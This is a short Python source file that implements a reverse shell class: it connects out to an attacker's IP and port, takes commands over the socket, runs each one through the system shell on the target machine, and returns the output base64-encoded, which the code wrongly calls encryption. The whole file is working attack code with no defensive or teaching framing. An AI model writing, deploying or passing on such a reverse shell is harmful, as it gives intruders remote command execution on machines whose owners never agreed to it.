import socket
import subprocess
import os
import base64
import ssl

class ReverseShell:
    def __init__(self, attack_ip, attack_port):
        self.attack_ip = attack_ip
        self.attack_port = attack_port

    def encrypt_data(self, data):
        """
        Encrypt the data to be sent using base64 encoding.
        """
        return base64.b64encode(data.encode()).decode()

    def create_reverse_shell(self):
        """
        Establish a reverse shell connection to the attacker's machine.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.attack_ip, self.attack_port))
            print("Reverse shell connection established.")

            while True:
                command = s.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break

                # Execute the command on the target machine
                result = subprocess.run(command, shell=True, capture_output=True)

                # Send back the result
                s.send(self.encrypt_data(result.stdout.decode('utf-8')).encode())

            s.close()
        except Exception as e:
            print(f"Error during reverse shell connection: {e}")
            return

    def start_shell(self):
        """
        Start the reverse shell.
        """
        print("Starting reverse shell...")
        self.create_reverse_shell()
